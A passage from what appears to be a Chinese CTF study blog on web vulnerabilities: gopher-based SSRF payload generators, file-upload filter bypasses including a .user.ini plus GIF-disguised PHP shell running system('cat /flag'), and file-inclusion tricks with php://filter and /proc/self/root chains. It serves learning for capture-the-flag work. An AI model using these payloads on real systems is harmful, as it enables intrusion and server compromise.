<p>比如<br><code>?url=file:///var/www/html/flag.php</code></p>
</blockquote>
<h4 id="2-GTE请求"><a href="#2-GTE请求" class="headerlink" title="2)GTE请求"></a>2)GTE请求</h4><blockquote>
<p>构造HTTP数据包</p>
<p>URL编码、替换回车换行为%0d%0a，HTTP包最后加%0d%0a代表消息结束</p>
<p>发送gopher协议, 协议后的IP一定要接端口</p>
</blockquote>
<h4 id="3-POST请求"><a href="#3-POST请求" class="headerlink" title="3)POST请求"></a>3)POST请求</h4><blockquote>
<p>POST与GET传参的区别：它有4个参数为必要参数</p>
<p>需要传递<br>Content-Type,<br>Content-Length,<br>host,<br>post的参数</p>
<p>比如：</p>
</blockquote>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">POST</span> /flag.php HTTP/<span class="number">1</span>.<span class="number">1</span></span><br><span class="line"><span class="attribute">Host</span>: <span class="number">127.0.0.1:80</span></span><br><span class="line"><span class="attribute">Content</span>-Length: <span class="number">36</span></span><br><span class="line"><span class="attribute">Content</span>-Type: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">key</span>=<span class="number">51457</span>bb0a50c1eb2c92dcc3ec3c2cc13        //post参数</span><br></pre></td></tr></table></figure>

<blockquote>
<p><code>Host</code>、<code>Content-Type</code>和<code>Content-Length</code>请求头是必不可少的，但在 GET请求中可以没有<br><code>切记：Content-Length 这个要和底下POST参数[比如例子中key=,4个+51457bb0a50c1eb2c92dcc3ec3c2cc13,32个，共计36个]长度一致</code></p>
</blockquote>
<p>python脚本生成payload（POST和GTE请求都适用）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">POST /flag.php HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 127.0.0.1</span></span><br><span class="line"><span class="string">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="string">Content-Length: 36</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">key=a68a3b03e80ce7fef96007dfa01dc077</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">tmp = urllib.parse.quote(payload) <span class="comment">#对payload中的特殊字符进行编码</span></span><br><span class="line">new = tmp.replace(<span class="string">&#x27;%0A&#x27;</span>,<span class="string">&#x27;%0D%0A&#x27;</span>) <span class="comment">#CRLFL漏洞</span></span><br><span class="line">result = <span class="string">&#x27;gopher://127.0.0.1:80/&#x27;</span>+<span class="string">&#x27;_&#x27;</span>+new</span><br><span class="line">result = urllib.parse.quote(result)<span class="comment"># 对新增的部分继续编码</span></span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure>

<h5 id="构造一个提交文件的POST请求"><a href="#构造一个提交文件的POST请求" class="headerlink" title="构造一个提交文件的POST请求"></a>构造一个提交文件的POST请求</h5><p>首先抓取一个正常提交文件的数据包，然后使用上述脚本将其转换为gopher协议的格式</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line">payload = \</span><br><span class="line"><span class="string">&quot;&quot;&quot;POST /flag.php HTTP/1.1</span></span><br><span class="line"><span class="string">Host: 127.0.0.1</span></span><br><span class="line"><span class="string">Content-Length: 293</span></span><br><span class="line"><span class="string">Cache-Control: max-age=0</span></span><br><span class="line"><span class="string">Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="string">Origin: http://challenge-a09b30b9de9fb026.sandbox.ctfhub.com:10080</span></span><br><span class="line"><span class="string">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryz0BDuCoolR1Vg7or</span></span><br><span class="line"><span class="string">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36</span></span><br><span class="line"><span class="string">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span></span><br><span class="line"><span class="string">Referer: http://challenge-a09b30b9de9fb026.sandbox.ctfhub.com:10080/?url=http://127.0.0.1/flag.php</span></span><br><span class="line"><span class="string">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="string">Accept-Language: zh-CN,zh;q=0.9</span></span><br><span class="line"><span class="string">Connection: close</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">------WebKitFormBoundaryz0BDuCoolR1Vg7or</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;test.txt&quot;</span></span><br><span class="line"><span class="string">Content-Type: text/plain</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">hello world!</span></span><br><span class="line"><span class="string">------WebKitFormBoundaryz0BDuCoolR1Vg7or</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name=&quot;submit&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">submit</span></span><br><span class="line"><span class="string">------WebKitFormBoundaryz0BDuCoolR1Vg7or--</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">tmp = urllib.parse.quote(payload)</span><br><span class="line">new = tmp.replace(<span class="string">&#x27;%0A&#x27;</span>,<span class="string">&#x27;%0D%0A&#x27;</span>)</span><br><span class="line">result = <span class="string">&#x27;gopher://127.0.0.1:80/&#x27;</span>+<span class="string">&#x27;_&#x27;</span>+new</span><br><span class="line">result = urllib.parse.quote(result)</span><br><span class="line"><span class="built_in">print</span>(result)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="gopher打FastCGI"><a href="#gopher打FastCGI" class="headerlink" title="gopher打FastCGI"></a>gopher打FastCGI</h4><blockquote>
<p><a href="https://blog.csdn.net/unexpectedthing/article/details/121643002">看我这一篇</a></p>
</blockquote>
<h4 id="gopher打redis"><a href="#gopher打redis" class="headerlink" title="gopher打redis"></a>gopher打redis</h4><blockquote>
<p><a href="https://blog.csdn.net/unexpectedthing/article/details/121667613">看我这一篇</a></p>
</blockquote>
<h4 id="gopher打mysql"><a href="#gopher打mysql" class="headerlink" title="gopher打mysql"></a>gopher打mysql</h4><p><code>gopher</code>打<code>mysql</code>，就是利用<code>gopher</code>协议传<code>shell</code>到<code>mysql</code>中。</p>
<p>首先Mysql存在三种连接方式</p>
<blockquote>
<p>Unix套接字；<br>内存共享&#x2F;命名管道；<br>TCP&#x2F;IP套接字；</p>
</blockquote>
<p><code>MySQL</code>客户端连接并登录服务器时存在两种情况：需要密码认证以及无需密码认证。</p>
<blockquote>
<p>当需要密码认证时使用挑战应答模式，服务器先发送salt然后客户端使用salt加密密码然后验证<br>当无需密码认证时直接发送TCP&#x2F;IP数据包即可</p>
</blockquote>
<p>这儿对<code>localhost</code>和127.0.0.1做一个区别</p>
<blockquote>
<p><code>localhost</code>也叫local ，正确的解释是：<code>本地服务器。</code><br><code>127.0.0.1</code>的正确解释是：<code>本机地址（本机服务器）</code>，它的解析通过本机的host文件，<code>windows自动将localhost解析为127.0.0.</code>1。</p>
<p><code>localhost（local）</code>是<code>不经网卡传输的，这点很重要，它不受网络防火墙和网卡相关的的限制</code>。</p>
<p><code>127.0.0.1</code>是通过<code>网卡传输，依赖网卡，并受到网络防火墙和网卡相关的限制</code></p>
<p>简单说<br>当我们通过<code>mysql -hlocalhost -uname</code>去连接的时候，**<code>没有经过网卡</code>**，使用的是<code>unix</code>套接字连接，这种时候我们<code>tcpdump</code>是抓不到包的<br>当我们需要抓取<code>mysql</code>通信数据包时<code>必须使用TCP/IP</code>套接字连接。<br><code>mysql -h 127.0.0.1 -uname</code></p>
</blockquote>
<p>我们平常打<code>mysql</code>最常用的就是打<strong>无密码</strong>的<code>mysql</code></p>
<p>但是我们在用<code>gopher</code>还是需要用<code>dict</code>协议去得到<code>mysql</code>的端口(默认是**<code>3306</code>**)</p>
<p>直接使用的<code>gopherus</code>工具,直接快速生成<code>payload</code></p>
<p><img src="/2022/05/28/Web-study/image-20220815234910350.png" alt="image-20220815234910350"></p>
<h1 id="漏洞知识点记录笔记（二）"><a href="#漏洞知识点记录笔记（二）" class="headerlink" title="漏洞知识点记录笔记（二）"></a>漏洞知识点记录笔记（二）</h1><h2 id="六、fileupload"><a href="#六、fileupload" class="headerlink" title="六、fileupload"></a>六、fileupload</h2><h3 id="1-多重过滤绕过"><a href="#1-多重过滤绕过" class="headerlink" title="1.多重过滤绕过"></a>1.多重过滤绕过</h3><p><u><strong>下面是以攻防世界的一道easyupload的wp讲解一些情形的绕过方式</strong></u></p>
<p>这里需要绕过的点如下</p>
<blockquote>
<ul>
<li>检查文件内容是否有<code>php</code>字符串</li>
<li>检查后缀中是否有<code>htaccess</code>或<code>php</code></li>
<li>检查文件头部信息</li>
<li>文件<code>MIME</code>类型</li>
</ul>
</blockquote>
<h4 id="短标签"><a href="#短标签" class="headerlink" title="短标签"></a>短标签</h4><p>对于<u>第一点</u>可以利用<strong>短标签</strong>绕过，例如 <code>&lt;?=phpinfo();?&gt;</code></p>
<blockquote>
<p>把<code>short_open_tag</code>字段改为<code>On</code>，就可以实现短标签功能</p>
<p>短标签：<br>1.能正常解析类似于这样形式的php文件： <code>phpinfo() ?&gt;</code>  </p>
<p>2.使用<code>&lt;?=$a?&gt;</code>的形式输出，在短标签看来，<code>&lt;?=$a?&gt;</code></p>
<p>3.<code>&lt;?=(表达式)?&gt;</code><br>就相当于</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="variable">$a</span><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> (表达式)<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
</blockquote>
<blockquote>
<p>正确：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"><span class="variable">$a</span> = <span class="number">123</span>;</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&#x27; phpinfo();?&gt;&lt;? echo $a ?&gt;&#x27;</span>)</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>报错：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"><span class="variable">$a</span> = <span class="number">123</span>;</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&#x27;&lt;? phpinfo();?&gt;&lt;?=$a ?&gt;&#x27;</span>)</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>从这个对比试验我们可以看出：<br>在短标签模式下，<br>我们执行php语句php函数，都用类似于这样形式的php文件：</p>
<figure class="highlight scss"><table><tr><td class="code"><pre><span class="line"><span class="built_in">phpinfo</span>();?&gt;</span><br></pre></td></tr></table></figure>

<p>但是我们要输出一个flag，或者变量时，使用<code>&lt;?=$a?&gt;</code>的形式输出</p>
</blockquote>
<h4 id="user-ini"><a href="#user-ini" class="headerlink" title=".user.ini"></a>.user.ini</h4><p>对于<u>第二点</u>可以通过上传<code>.user.ini</code>以及正常<code>jpg</code>文件来进行<code>getshell</code>,可以参考以下文章</p>
<blockquote>
<p><a href="https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html">文章</a></p>
</blockquote>
<p><strong>在服务器中，只要是运用了fastcgi的服务器就能够利用该方式getshell，不论是apache或者ngnix或是其他服务器。</strong></p>
<p> <strong>这个文件是php.ini的补充文件，当网页访问的时候就会自动查看当前目录下是否有.user.ini，然后将其补充进php.ini，并作为cgi的启动项。</strong></p>
<p> <strong>其中很多功能设置了只能php.ini配置，但是还是有一些危险的功能可以被我们控制，比如auto_prepend_file。</strong></p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line">.<span class="keyword">user</span>.ini内容</span><br><span class="line"></span><br><span class="line">auto_prepend_file=<span class="number">5</span>.jpg</span><br><span class="line"></span><br><span class="line">这样.<span class="keyword">user</span>.ini当前目录下的文件会自动包含图片🐎，从而让我们成功拿到<span class="keyword">shell</span></span><br></pre></td></tr></table></figure>

<p><u>第三点</u>绕过方式即在文件头部添加一个图片的<strong>文件头</strong>，比如<code>GIF89a</code></p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">JPG</span> ：FF D8 FF E0 <span class="number">00</span> <span class="number">10</span> <span class="number">4</span>A <span class="number">46</span> <span class="number">49</span> <span class="number">46</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">GIF</span>(相当于文本的GIF89a)：<span class="number">47</span> <span class="number">49</span> <span class="number">46</span> <span class="number">38</span> <span class="number">39</span> <span class="number">61</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">PNG</span>： <span class="number">89</span> <span class="number">50</span> <span class="number">4</span>E <span class="number">47</span></span><br></pre></td></tr></table></figure>

<p><u>第四点</u>绕过方法即修改上传时的<code>Content-Type</code></p>
<p>因此最终的<code>payload</code>为：<br> 上传<code>.user.ini</code>，内容为</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">GIF89a                  </span><br><span class="line"><span class="attribute">auto_prepend_file</span>=a.jpg</span><br></pre></td></tr></table></figure>

<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">auto</span>_append_file、<span class="built_in">auto</span>_prepend_file:指定一个文件，自动包含在要执行的文件前，类似于在文件前调用了require()函数。而<span class="built_in">auto</span>_append_file类似，只是在文件后面包含。 </span><br><span class="line"></span><br><span class="line">使用方法很简单，直接写在.user.ini中：</span><br></pre></td></tr></table></figure>

<p>上传a.jpg，内容为</p>
<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br><span class="line"><span class="meta">&lt;?</span>=<span class="keyword">system</span>(<span class="string">&#x27;cat /flag&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="2-文件类型"><a href="#2-文件类型" class="headerlink" title="2.文件类型"></a>2.文件类型</h3><p><img src="https://img-blog.csdnimg.cn/20200226180218842.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2phdmFqaWF3ZWk=,size_16,color_FFFFFF,t_70" alt="img"></p>
<h3 id="3-其他绕过"><a href="#3-其他绕过" class="headerlink" title="3.其他绕过"></a>3.其他绕过</h3><h4 id="1）-DATA绕过"><a href="#1）-DATA绕过" class="headerlink" title="1）::$DATA绕过"></a>1）::$DATA绕过</h4><blockquote>
<p>● 绕过⽅法：</p>
<p>○ 通过抓取上传数据包，修改上传的⽂件后缀，实现上传。</p>
<p>绕过原理：</p>
<p>● 与上⾯题相⽐呢这个道题去掉了：$file_ext &#x3D; str_ireplace(‘::$DATA’, ‘’, $file_ext);&#x2F;&#x2F;去除字符</p>
<p>串::$DATA 这⾏代码。</p>
<p>● ::$DATA 是什么意思呢？必须是windows, 必须是php, 必须是那个源⽂件，php在window的时候如</p>
<p>果⽂件名+”::$DATA”会把::$DATA之后的数据当成⽂件流处理,不会检测后缀名.且持”::$DATA”之前</p>
<p>的⽂件名</p>
<p>● 他的⽬的就是不检查后缀名</p>
</blockquote>
<h4 id="2）点-空格-点绕过"><a href="#2）点-空格-点绕过" class="headerlink" title="2）点+空格+点绕过"></a>2）点+空格+点绕过</h4><blockquote>
<p>例如，只允许上传.jpg|.png|.gif后缀的⽂件！</p>
<p>● 绕过⽅法：</p>
<p>○ 通过抓取上传数据包，修改上传的⽂件后缀，实现上传。</p>
<p>绕过原理：</p>
<p>● 在windows系统下，如果⽂件名以“.”或者空格作为结尾，系统会⾃动删除“.”与空格，利⽤此特性</p>
<p>也可以绕过⿊名单验证。apache中可以利⽤点结尾和空格绕过，asp和aspx中可以⽤空格绕过。</p>
<p>● 经过脚本⼀系列的处理之后原本.php. .的后缀名变成了.php. ，</p>
<p>⽽由于Windows的特性，⼜将⽂件末尾的点给去除了，</p>
<p>最终就存的时候.php的⽂件。同理也可以上传.htaccess. .等⽂件。。。</p>
<p>(就算没有经过脚本的处理,.php. .在windows中也是会被存储为.php)</p>
</blockquote>
<h4 id="3）00截断"><a href="#3）00截断" class="headerlink" title="3）00截断"></a>3）00截断</h4><blockquote>
<p>绕过原理：</p>
<p>● 这时候就要利⽤0x00截断原理了，具体原理是 系统在对⽂件名的读取时，如果遇到0x00，就会认</p>
<p>为读取已结束。</p>
<p>● 但要注意是⽂件的16进制内容⾥的00，⽽不是⽂件名中的00 ！！！就是说系统是按16进制读取⽂</p>
<p>件（或者说⼆进制），</p>
<p>● 遇到ascii码为零的位置就停⽌，⽽这个ascii码为零的位置在16进制中是00，⽤0x开头表示16进</p>
<p>制，也就是所说的0x00截断</p>
<p>● 当系统读取到0x00时，认为已经结束，不会再读取后⾯将要拼接的13.jpg,认为是php⽂件，</p>
<p>完成绕过。</p>
<p>%<strong>00</strong>截断 与 <strong>0</strong>x<strong>00</strong>截断的区别？</p>
<p>● 地址上⾯⽂件命名的区别。</p>
<p>● %00上是建⽴在地址信息上的</p>
<p>● 0x00 ⽂件</p>
<p>● 操作⽅法基本⼀致。</p>
<p>%<strong>00</strong>截断 与 <strong>0</strong>x<strong>00</strong>截断的实战中的区别？</p>
<p>● 平时⼀定要多观察⼀下数据包，数据包中包含了很多参数，很多参数可以进⾏修改。</p>
</blockquote>
<h4 id="4）二次渲染-条件竞争"><a href="#4）二次渲染-条件竞争" class="headerlink" title="4）二次渲染+条件竞争"></a>4）二次渲染+条件竞争</h4><blockquote>
<p>⼆次渲染：就是根据⽤户上传的图⽚，新⽣成⼀个图⽚，将原始图⽚删除，将新图⽚添加到数据库中。<br>⽐如⼀些⽹站根据⽤户上传的头像⽣成⼤中⼩不同尺⼨的图像</p>
</blockquote>
<blockquote>
<p>条件竞争就是在，当二次渲染先把文件移动到储存目录后，才判断文件是否合法时<br>就产⽣了漏洞，会有⼀个短暂的时间将我们上传的webshell存储在⽬录下，且以我们上传的<br>⽂件名的形式</p>
<p>但是这个时间相当相当短暂，以⾄于，你打开上传⽬录，点击上传⽂件，你连影⼦都看不到就已经<br>没了，</p>
<p>所以这个时候我们可以使⽤burpsuite，我们先抓包，然后发送到intruder模块。<br>点击clear去除所有参数，然后payload选择⽆，并且选择持续发包。</p>
</blockquote>
<blockquote>
<p>⼆次渲染只能靠这个条件竞争去绕过么？<br>○ ⼆次渲染：说的是这个技术叫做⼆次渲染，不是说⼆次渲染有漏洞。<br>○ 有漏洞可利⽤的原因是因为，他是在⽂件上传之后才有的后续操作，第⼀步的时候已经将⽂件<br>上传到服务器上了。<br>○ 如果这个⼆次渲染在第⼀步之前，这个⼆次渲染是没有任何问题的。<br>○ ⼆次渲染不是漏洞，是⼀种技术，是⼀种逻辑上的验证，条件竞争。<br>○ 利⽤条件竞争，防⽌他第⼆步操作</p>
</blockquote>
<hr>
<h2 id="七、fileinclude"><a href="#七、fileinclude" class="headerlink" title="七、fileinclude"></a>七、fileinclude</h2><h3 id="1-文件包含的四个函数："><a href="#1-文件包含的四个函数：" class="headerlink" title="1.文件包含的四个函数："></a>1.文件包含的四个函数：</h3><p>1.include():将在其被调用的位置处包含一个文件。包含一个文件与在该语句所在位置复制制定文件的数据具有相同内容的效果。使用include()时可以忽略括号。</p>
<p>2.include_once():在脚本执行期间包含并运行指定文件。此行为和 include() 语句类似，<u><strong>唯一区别是include_once()会先判断一下这个文件在之前是否已经被包含过，如已经包含，则忽略本次包含。</strong></u></p>
<p>3.replace() :很大程度上与include相同，都是将一个模板文件包含到require调用坐在的位置。</p>
<p>require和include之间有两点重要的区别:</p>
<p>1.无论require的位置如何，制定文件都将包含到出现require的脚本中。例如，即使require放在计算结果为假的if语句中，依然会包含指定文件。<br>2.require出错时，脚本将停止运行，而在使用include的情况下，脚本将继续执行。</p>
<p>4.replace_once():在脚本执行期间包含并运行指定文件。此行为和 require() 语句类似，<u><strong>唯一区别是require_once()会先判断一下这个文件在之前是否已经被包含过，如已经包含，则忽略本次包含</strong></u></p>
<h4 id="require-once-多次包含"><a href="#require-once-多次包含" class="headerlink" title="*require_once()多次包含"></a><code>*require_once()</code>多次包含</h4><p><u><strong>下面是一篇关于<code>require_once被使用后不能再使用怎么绕开</code>的文章，本人在2022年5月Dest0g3二次招新比赛遇到类似，特此记录</strong></u></p>
<blockquote>
<p><a href="https://www.anquanke.com/post/id/213235">php源码分析 require_once 绕过不能重复包含文件的限制</a></p>
</blockquote>
<blockquote>
<p><code>require_once()</code><br>在对软链接的操作上存在一些缺陷，软连接层数较多会使hash匹配直接失效造成重复包含，超过20次软链接后可以绕过，外加伪协议编码一下：</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">?file=php:<span class="regexp">//</span>filter<span class="regexp">/convert.base64-encode/</span>resource=<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>proc<span class="regexp">/self/</span>root<span class="regexp">/proc/</span>self<span class="regexp">/root/</span>var<span class="regexp">/www/</span>html/flag.php</span><br></pre></td></tr></table></figure>
</blockquote>
<p>下面该题代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="comment">//find something in flag1.php </span></span><br><span class="line"><span class="variable">$d</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;d&#x27;</span>]; </span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;ctf&#x27;</span>]; </span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">filter_var</span>(<span class="variable">$d</span>, FILTER_VALIDATE_URL)) &#123;   </span><br><span class="line">    <span class="variable">$r</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$d</span>);   </span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$file</span>)) &#123;     </span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$file</span>, <span class="string">&quot;lai&quot;</span>) !== <span class="literal">false</span> &amp;&amp;</span><br><span class="line">  <span class="title function_ invoke__">strpos</span>(<span class="variable">$file</span>, <span class="string">&quot;ya&quot;</span>) !== <span class="literal">false</span>)  &#123;       </span><br><span class="line">            @<span class="keyword">include</span>(<span class="variable">$file</span> . <span class="string">&#x27;.php&#x27;</span>);     </span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;       </span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Sorry, you can not pass&quot;</span>);     </span><br><span class="line">        &#125;     </span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/labour$/&#x27;</span>, <span class="variable">$r</span>[<span class="string">&#x27;host&#x27;</span>])) &#123;   </span><br><span class="line">                  @<span class="variable">$a</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$d</span>);       </span><br><span class="line">                  <span class="keyword">echo</span> (<span class="variable">$a</span>);     </span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;                                      <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);     </span><br><span class="line">                                    &#125;  </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;    </span><br><span class="line">          <span class="keyword">die</span>(<span class="string">&quot;why?&quot;</span>);   </span><br><span class="line">    &#125; </span><br><span class="line">&#125; <span class="keyword">else</span> &#123;   </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Invalid URL&quot;</span>; </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p><strong>文章关键：</strong></p>
<p><u><strong>php的文件包含机制是将已经包含的文件与文件的真实路径放进哈希表中，当已经<code>require_once(&#39;flag.php&#39;)</code>，已经include的文件不可以再require_once。</strong></u></p>
<p><u><strong>今天就来谈谈，怎么设想如何绕过这个哈希表，让php认为我们传入的文件名不在哈希表中，又可以让php能找到这个文件，读取到内容。</strong></u></p>
<p><u><strong>在这里有个小知识点，<code>/proc/self</code>指向当前进程的<code>/proc/pid/</code>，<code>/proc/self/root/</code>是指向<code>/</code>的符号链接，想到这里，用伪协议配合多级符号链接的办法进行绕过</strong></u></p>
<p>payload:</p>
<p>?d&#x3D;0:&#x2F;&#x2F;labour&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;flll1ag2.txt&amp;ctf&#x3D;laiya</p>
<h3 id="2-php伪协议："><a href="#2-php伪协议：" class="headerlink" title="2.php伪协议："></a>2.php伪协议：</h3><p>内容来自于<a href="https://blog.csdn.net/qz362228/article/details/124359070">https://blog.csdn.net/qz362228/article/details/124359070</a></p>
<p><img src="https://img-blog.csdnimg.cn/92c9df98952f41669db5d8b8b2ffaead.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA5LmU5rK7Nzc3,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p>
<h4 id="1-php-x2F-x2F-协议"><a href="#1-php-x2F-x2F-协议" class="headerlink" title="1.php:&#x2F;&#x2F;协议"></a>1.php:&#x2F;&#x2F;协议</h4><p><strong>·条件：</strong></p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">allow_url_fopen:<span class="keyword">off</span>/<span class="keyword">on</span></span><br><span class="line">allow_url_include #仅php://<span class="keyword">input</span> php://stdin php://memory php://<span class="keyword">temp</span> 需要<span class="keyword">on</span></span><br></pre></td></tr></table></figure>

<p><strong>·作用：</strong></p>
<blockquote>
<p><code>php://</code> 访问各个输入&#x2F;输出流（I&#x2F;O streams），在CTF中经常使用的是<code>php://filter</code>和<code>php://input</code>，<code>php://filter</code>用于<strong>读取源码</strong>，<code>php://input</code>用于<strong>执行php代码</strong>。</p>
</blockquote>
<p><strong>·说明</strong>：</p>
<blockquote>
<p>PHP 提供了一些杂项输入&#x2F;输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符，<br>内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器</p>
</blockquote>
<h4 id="2-php-x2F-x2F-filter伪协议"><a href="#2-php-x2F-x2F-filter伪协议" class="headerlink" title="2.php:&#x2F;&#x2F;filter伪协议"></a>2.php:&#x2F;&#x2F;filter伪协议</h4><p><strong>·条件</strong></p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">allow_url_fopen</span>=<span class="literal">on</span>/<span class="literal">off</span></span><br><span class="line"><span class="attr">allow_url_include</span>=<span class="literal">on</span>/<span class="literal">off</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>只是<code>读取</code>，需要开启<code>allow_url_fopen</code>，不需要开启<code>allow_url_include</code></p>
</blockquote>
<p><strong>·说明：</strong></p>
<blockquote>
<p>元封装器，设计用于”数据流打开”时的”筛选过滤”应用，对本地磁盘文件进行读写<br>①输出进行<code>base64</code>加密后的信息</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">?file=php:<span class="regexp">//</span>filter<span class="regexp">/convert.base64-encode/</span>resource=xx.php</span><br></pre></td></tr></table></figure>

<p>或</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">?file=php:<span class="regexp">//</span>filter<span class="regexp">/read=convert.base64-encode/</span>resource=xx.php</span><br></pre></td></tr></table></figure>

<p>②获得将base64加密后的信息后，再将其解密，得出原信息</p>
</blockquote>
<h5 id="绕过base过滤"><a href="#绕过base过滤" class="headerlink" title="绕过base过滤"></a>绕过base过滤</h5><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">php:<span class="regexp">//</span>filter<span class="regexp">/string.rot13/</span>resource=flag.php</span><br></pre></td></tr></table></figure>

<blockquote>
<p>ROT13 编码简单地使用字母表中后面第 13 个字母替换当前字母，同时忽略非字母表中的字符。</p>
</blockquote>
<h4 id="3-php-x2F-x2F-input（读取POST数据）"><a href="#3-php-x2F-x2F-input（读取POST数据）" class="headerlink" title="3.php:&#x2F;&#x2F;input（读取POST数据）"></a>3.php:&#x2F;&#x2F;input（读取POST数据）</h4><p><strong>·条件</strong></p>
<figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">allow_url_fopen</span>=<span class="literal">on</span>/<span class="literal">off</span></span><br><span class="line"><span class="attr">allow_url_include</span>=<span class="literal">on</span></span><br></pre></td></tr></table></figure>

<p><strong>·说明</strong></p>
<blockquote>
<p>可以访问请求的原始数据的只读流。在post请求中能查看请求的原始数据，<u><strong>并将post请求中的post数据当作php代码执行</strong></u>。（只读流是说只能进行读操作的数据）</p>
</blockquote>
<p><code>例如</code></p>
<p>下面的POST数据里的命令就会被执行</p>
